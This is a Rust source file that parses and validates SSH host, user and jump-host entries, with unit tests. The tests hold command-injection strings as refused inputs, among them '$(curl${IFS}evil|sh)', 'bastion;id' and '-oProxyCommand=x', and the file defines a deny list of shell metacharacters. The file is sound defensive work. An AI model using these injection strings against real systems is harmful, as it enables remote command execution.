use std::fmt;

use tablepro_core::{SshDestinationPart as Part, SshDestinationProblem};

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct SshDestination {
    host: String,
    port: Option<u16>,
    user: Option<String>,
}

impl SshDestination {
    pub fn new(host: impl AsRef<str>, port: Option<u16>, user: Option<String>) -> Result<Self, SshDestinationProblem> {
        let trimmed = host.as_ref().trim();
        let host = trimmed
            .strip_prefix('[')
            .and_then(|inner| inner.strip_suffix(']'))
            .unwrap_or(trimmed);
        check_part(Part::Host, host)?;
        if port == Some(0) {
            return Err(SshDestinationProblem::PortZero);
        }
        if let Some(user) = &user {
            check_part(Part::User, user)?;
        }
        Ok(Self {
            host: host.to_owned(),
            port,
            user,
        })
    }

    pub fn parse_jump_list(list: &str) -> Result<Vec<SshDestination>, SshDestinationProblem> {
        if list.trim().is_empty() {
            return Ok(Vec::new());
        }
        list.split(',').map(|entry| Self::parse(entry.trim())).collect()
    }

    fn parse(entry: &str) -> Result<SshDestination, SshDestinationProblem> {
        let (user, rest) = match entry.rsplit_once('@') {
            Some((user, rest)) => (Some(user.to_owned()), rest),
            None => (None, entry),
        };
        let (host, port) = if let Some(bracketed) = rest.strip_prefix('[') {
            let (host, after) = bracketed
                .split_once(']')
                .ok_or(SshDestinationProblem::UnclosedBracket)?;
            match after {
                "" => (host, None),
                _ => (host, Some(parse_port(after.strip_prefix(':').unwrap_or(after))?)),
            }
        } else {
            match rest.split_once(':') {
                Some((host, port)) if !port.contains(':') => (host, Some(parse_port(port)?)),
                _ => (rest, None),
            }
        };
        Self::new(host, port, user)
    }

    pub fn host(&self) -> &str {
        &self.host
    }

    pub fn port(&self) -> Option<u16> {
        self.port
    }

    pub fn user(&self) -> Option<&str> {
        self.user.as_deref()
    }
}

impl fmt::Display for SshDestination {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        if let Some(user) = &self.user {
            write!(f, "{user}@")?;
        }
        if self.host.contains(':') {
            write!(f, "[{}]", self.host)?;
        } else {
            f.write_str(&self.host)?;
        }
        if let Some(port) = self.port {
            write!(f, ":{port}")?;
        }
        Ok(())
    }
}

/// What OpenSSH 9.6 refuses in a host or user name from the command line
/// (`valid_hostname` and `valid_ruser` in ssh.c), plus the comma that
/// separates `-J` hops. Older clients paste a jump hop into a proxy
/// command that `sh -c` runs, so one of these would run as a command.
const SHELL_CHARACTERS: &[char] = &['\'', '`', '"', '$', ';', '&', '<', '>', '|', '(', ')', '{', '}', ','];

/// What the shell globs in that proxy command, and where OpenSSH cuts a
/// ProxyJump value as a comment.
const GLOB_AND_COMMENT_CHARACTERS: &[char] = &['*', '?', '[', ']', '#'];

/// A Windows account may be DOMAIN\user; a host name never holds a
/// backslash.
fn allows_backslash(part: Part) -> bool {
    part == Part::User
}

/// A jump host whose own configuration would trust a key without
/// asking is named in a `Host` line, where `!` negates the pattern.
fn allows_bang(part: Part) -> bool {
    part == Part::User
}

fn check_part(part: Part, value: &str) -> Result<(), SshDestinationProblem> {
    if value.is_empty() {
        return Err(SshDestinationProblem::Empty { part });
    }
    if value.starts_with('-') {
        return Err(SshDestinationProblem::LeadingDash { part });
    }
    if value.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(SshDestinationProblem::Whitespace { part });
    }
    if let Some(character) = value.chars().find(|c| {
        SHELL_CHARACTERS.contains(c) || GLOB_AND_COMMENT_CHARACTERS.contains(c) || (*c == '!' && !allows_bang(part))
    }) {
        return Err(SshDestinationProblem::Character { part, character });
    }
    // A trailing backslash would escape whatever ssh appends after it.
    if value.ends_with('\\') || (!allows_backslash(part) && value.contains('\\')) {
        return Err(SshDestinationProblem::Character { part, character: '\\' });
    }
    Ok(())
}

fn parse_port(text: &str) -> Result<u16, SshDestinationProblem> {
    text.parse::<u16>()
        .map_err(|_| SshDestinationProblem::NotAPort { text: text.to_owned() })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn character(part: Part, character: char) -> SshDestinationProblem {
        SshDestinationProblem::Character { part, character }
    }

    #[test]
    fn each_refusal_names_the_part_and_what_is_wrong_with_it() {
        let user = |name: &str| SshDestination::new("bastion", None, Some(name.to_owned()));
        let cases = [
            (
                SshDestination::new("", None, None),
                SshDestinationProblem::Empty { part: Part::Host },
            ),
            (
                SshDestination::new("-oProxyCommand=x", None, None),
                SshDestinationProblem::LeadingDash { part: Part::Host },
            ),
            (
                SshDestination::new("bastion host", None, None),
                SshDestinationProblem::Whitespace { part: Part::Host },
            ),
            (
                SshDestination::new("bastion\u{7}", None, None),
                SshDestinationProblem::Whitespace { part: Part::Host },
            ),
            (
                SshDestination::new("bastion", Some(0), None),
                SshDestinationProblem::PortZero,
            ),
            (user("-lroot"), SshDestinationProblem::LeadingDash { part: Part::User }),
            (user(""), SshDestinationProblem::Empty { part: Part::User }),
            (
                SshDestination::new("$(touch${IFS}pwned)", None, None),
                character(Part::Host, '$'),
            ),
            (
                SshDestination::new("bastion;id", None, None),
                character(Part::Host, ';'),
            ),
            (
                SshDestination::new("bastion`id`", None, None),
                character(Part::Host, '`'),
            ),
            (
                SshDestination::new("bastion|id", None, None),
                character(Part::Host, '|'),
            ),
            (
                SshDestination::new("bastion\\x", None, None),
                character(Part::Host, '\\'),
            ),
            (user("ops'x"), character(Part::User, '\'')),
            (user("ops\\"), character(Part::User, '\\')),
            (SshDestination::new("jump*", None, None), character(Part::Host, '*')),
            (SshDestination::new("jump?", None, None), character(Part::Host, '?')),
            (SshDestination::new("!jump", None, None), character(Part::Host, '!')),
            (SshDestination::new("jump#1", None, None), character(Part::Host, '#')),
            (user("#ops"), character(Part::User, '#')),
            (user("ops*"), character(Part::User, '*')),
        ];
        for (result, expected) in cases {
            assert_eq!(result, Err(expected));
        }
        let accepted = SshDestination::new(" bastion.example.com ", Some(2222), Some("deploy".to_owned())).unwrap();
        assert_eq!(accepted.host(), "bastion.example.com");
        assert_eq!(accepted.to_string(), "deploy@bastion.example.com:2222");
        let domain_user = SshDestination::new("winhost", None, Some("CORP\\deploy".to_owned())).unwrap();
        assert_eq!(domain_user.user(), Some("CORP\\deploy"));
    }

    #[test]
    fn a_jump_hop_with_shell_characters_is_refused() {
        let cases = [
            ("$(curl${IFS}evil|sh)", character(Part::Host, '$')),
            ("ops@jump1,`id`", character(Part::Host, '`')),
            ("jump1&id", character(Part::Host, '&')),
            ("ops;id@jump1", character(Part::User, ';')),
        ];
        for (list, expected) in cases {
            assert_eq!(SshDestination::parse_jump_list(list), Err(expected), "{list}");
        }
    }

    #[test]
    fn a_bad_jump_hop_says_which_part_is_wrong() {
        assert_eq!(
            SshDestination::parse_jump_list("jump1,,jump2"),
            Err(SshDestinationProblem::Empty { part: Part::Host })
        );
        assert_eq!(
            SshDestination::parse_jump_list("jump1:ssh"),
            Err(SshDestinationProblem::NotAPort { text: "ssh".to_owned() })
        );
        assert_eq!(
            SshDestination::parse_jump_list("[fd00::1:22"),
            Err(SshDestinationProblem::UnclosedBracket)
        );
    }

    #[test]
    fn jump_list_parses_user_port_and_ipv6() {
        let hops =
            SshDestination::parse_jump_list("deploy@jump1:2200, jump2 ,[fd00::1]:22,ops@[fd00::2],fd00::3").unwrap();
        let rendered: Vec<String> = hops.iter().map(ToString::to_string).collect();
        assert_eq!(
            rendered,
            [
                "deploy@jump1:2200",
                "jump2",
                "[fd00::1]:22",
                "ops@[fd00::2]",
                "[fd00::3]"
            ]
        );
        assert_eq!(SshDestination::parse_jump_list("  ").unwrap(), Vec::new());
    }
}
